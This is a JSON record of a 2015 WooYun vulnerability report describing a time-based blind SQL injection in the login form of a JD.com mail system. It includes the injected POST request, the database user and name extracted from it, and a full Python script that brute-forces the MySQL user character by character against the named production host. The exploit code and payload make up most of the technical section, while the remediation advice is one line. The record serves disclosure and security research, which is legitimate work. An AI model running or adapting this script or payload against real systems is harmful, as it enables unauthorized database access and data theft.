{"id": 73933, "wybug_id": "wooyun-2015-0164982", "wybug_title": "京东商城某重要系统MySQL注射(附验证脚本)", "wybug_corp": "京东商城", "wybug_author": "lijiejie", "wybug_date": "2015-12-26 18:35", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 京东商城某重要系统MySQL注射(附验证脚本) 详细说明：  注射点：\nPOST https://mail.jd.com/Erpout/Logon.aspxcaptcha=test&destination=https://mail.jd.com/owa/&flags=0&forcedownlevel=0&isflag=0&isUtf8=1&maindo=mail.jd.com&showCheck=0&trusted=4&txtPassword=test&txtUser=aaaa'XOR(if(ascii(mid(user(),1,1))=106%2cbenchmark(10000000,md5(1))%2c0))OR'bbb&__EVENTVALIDATION=/wEWBwLxrpTlDwKK4MvjBQLB2tiHDgK1qbSRCwLk6JP4DALErdS5DwKqh7gQj3wgMfb0vbvb1oZ%2bQLNUO5k2Fs0%3d&__VIEWSTATE=/wEPDwULLTEyOTM4NDQ0ODFkZJ5XXKyC0nN6Jccew80z8q/DFEs5\n参数txtUser可注入，MySQL time blind。benchmark(15000000,md5(1)),响应时间大于2.0s。   漏洞证明：  猜解MySQL user(),得到：\n[Done]MySQL user is jdmail_rw@172.17.27.41\n\ndatabase():   jdmail\n\n\npython验证脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': 'ValiCode=PDC9BIL5P735'}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'start to retrive MySQL user:'user = ''for i in range(1, 23):    for payload in payloads:        conn = httplib.HTTPSConnection('mail.jd.com', timeout=30)        s = \"captcha=test&destination=https://mail.jd.com/owa/&\" \\            \"flags=0&forcedownlevel=0&isflag=0&isUtf8=1&maindo=mail.jd.com&showCheck=0\" \\            \"&trusted=4&txtPassword=test&\" \\            \"txtUser=aaaa'XOR(if(ascii(mid(user(),\"+str(i)+\",1))=\"+str(ord(payload))+\"%2cbenchmark(15000000,md5(1))%2c0))OR'bbb\" \\            \"&__EVENTVALIDATION=/wEWBwLxrpTlDwKK4MvjBQLB2tiHDgK1qbSRCwLk6JP4DALErdS5DwKqh7gQj3wgMfb0vbvb1oZ%2bQLNUO5k2Fs0%3d\" \\            \"&__VIEWSTATE=/wEPDwULLTEyOTM4NDQ0ODFkZJ5XXKyC0nN6Jccew80z8q/DFEs5\"        conn.request(method='POST',                     url=\"/Erpout/Logon.aspx\",                     body=s,                     headers = headers)        start_time = time.time()        html_doc = conn.getresponse().read()        conn.close()        if time.time() - start_time > 2.0:            user += payload            print '\\n[In progress] %s' % user            break        else:            print '.',            print '\\n[Done]MySQL user is', user\n   修复方案：  参数转义，过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-27 21:33 厂商回复： 非常感谢您对京东安全的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-26 19:50 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:36        | 药药切克闹,充气娃娃迷幻药)\t\t \n  666    \n     2015-12-26 20:33 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  屌    \n     2015-12-26 21:25 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  这个关注下。    \n     2015-12-26 21:44 |    \t\tbigx \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:45        | cisp cissp cisa ncie 乌云...)\t\t \n  关注    \n     2015-12-26 22:12 |    \t\t故滨 \t\t\t( 普通白帽子  |\t\t\t        Rank:311 漏洞数:40        )\t\t \n  猪猪侠    \n     2015-12-26 23:49 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:208 漏洞数:57        | 工欲善其事，必先利其器)\t\t \n  挖大厂的，赞一个    \n     2015-12-27 21:37 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:63        | 潜心代码审计。)\t\t \n  牛逼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}